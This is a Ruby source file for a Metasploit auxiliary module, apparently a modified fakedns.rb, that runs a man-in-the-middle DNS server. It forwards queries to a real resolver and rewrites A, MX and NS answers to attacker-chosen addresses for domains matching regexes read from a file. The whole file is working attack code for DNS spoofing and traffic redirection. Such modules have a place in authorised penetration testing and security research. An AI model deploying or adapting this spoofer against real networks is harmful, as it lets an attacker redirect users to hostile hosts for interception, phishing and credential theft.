##
# $Id: fakedns.rb 5540 2008-06-25 23:04:19Z hdm $
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require 'msf/core'
require 'resolv'

module Msf

class Auxiliary::Server::MITM_FakeDNS < Msf::Auxiliary

	include Auxiliary::Report
	
	def initialize
		super(
			'Name'        => 'MITM DNS Service',
			'Version'     => '$Revision: 5540 $',
			'Description'    => %q{
			  This hack of the metasploit fakedns.rb serves as a sort 
			  of MITM DNS server.  Requests are passed through to a real
			  DNS server, and the responses are modified before being
			  returned to the client, if they match regular expressions
			  set in FILENAME.
			},
			'Author'      => ['ddz', 'hdm', 'Wesley McGrew <wesley@mcgrewsecurity.com>'],
			'License'     => MSF_LICENSE,
			'Actions'     =>
				[
				 	[ 'Service' ]
				],
			'PassiveActions' => 
				[
					'Service'
				],
			'DefaultAction'  => 'Service'
		)

		register_options(
			[
				OptAddress.new('SRVHOST',   [ true, "The local host to listen on.", '0.0.0.0' ]),
				OptPort.new('SRVPORT',      [ true, "The local port to listen on.", 53 ]),
				# W: Added in an option for a set of filters, took out the catchall TARGETHOST
				OptAddress.new('REALDNS', [true,"Ask this server for answers",nil]),
				OptString.new('FILENAME', [true,"File of ip,regex for filtering responses",nil])
			], self.class)
	end

	
	def run
		
		begin
		  fp = File.new(datastore['FILENAME'])
		rescue
		  print_status "Could not open #{datastore['FILENAME']} for reading.  Quitting."
	    return
		end
		mod_entries = []
		while !fp.eof?
	    entry = fp.gets().chomp().split(',')
	    mod_entries.push([entry[0],Regexp.new(entry[1])])
	  end
		

		@port = datastore['SRVPORT'].to_i

    # MacOS X workaround
    ::Socket.do_not_reverse_lookup = true
            
    @sock = ::UDPSocket.new()
    @sock.setsockopt(::Socket::SOL_SOCKET, ::Socket::SO_REUSEADDR, 1)
    @sock.bind(datastore['SRVHOST'], @port)
    @run = true
		
		Thread.new {
		# Wrap in exception handler
		  begin
		
        while @run
          packet, addr = @sock.recvfrom(65535)
          if (packet.length == 0)
              break
          end

          request = Resolv::DNS::Message.decode(packet)
          
    
          # W: Go ahead and send it to the real DNS server and
          #    get the response
          sock2 = ::UDPSocket.new()
          sock2.send(packet, 0, datastore['REALDNS'], 53) #datastore['REALDNS'], 53) 
          packet2, addr2 = sock2.recvfrom(65535)
          sock2.close()
                    
          
          real_response = Resolv::DNS::Message.decode(packet2)
          fake_response = Resolv::DNS::Message.new()
          
          fake_response.qr = 1 # Recursion desired
          fake_response.ra = 1 # Recursion available
          fake_response.id = real_response.id
          
          real_response.each_question { |name, typeclass|
            fake_response.add_question(name, typeclass)
          }
          
          real_response.each_answer { |name, ttl, data| 
            replaced = false
            mod_entries.each { |e|
              if name.to_s =~ e[1]
                case data.to_s 
                when /IN::A/
                  data = Resolv::DNS::Resource::IN::A.new(e[0])
                  replaced = true
                when /IN::MX/
                  data = Resolv::DNS::Resource::IN::MX.new(10,Resolv::DNS::Name.create(e[0]))
                  replaced = true
                when /IN::NS/
                  data = Resolv::DNS::Resource::IN::NS.new(Resolv::DNS::Name.create(e[0]))
                  replaced = true
                when /IN::PTR/
                  # Do nothing
                  replaced = true
                else
                  # Do nothing
                  replaced = true
                end
              end
              break if replaced
            }
            fake_response.add_answer(name,ttl,data)
          }
          
          real_response.each_authority { |name, ttl, data|
            mod_entries.each { |e|
              if name.to_s =~ e[1] 
                data = Resolv::DNS::Resource::IN::NS.new(Resolv::DNS::Name.create(e[0]))
                break
              end
            }
            fake_response.add_authority(name,ttl,data)
          }
          
          response_packet = fake_response.encode()
          
          @sock.send(response_packet, 0, addr[3], addr[1])
        end
		
		# Make sure the socket gets closed on exit
		  rescue ::Exception => e
			  print_error("fakedns: #{e.class} #{e} #{e.backtrace}")
		  ensure
			  @sock.close
		  end
		
		}
		
	end

end
end
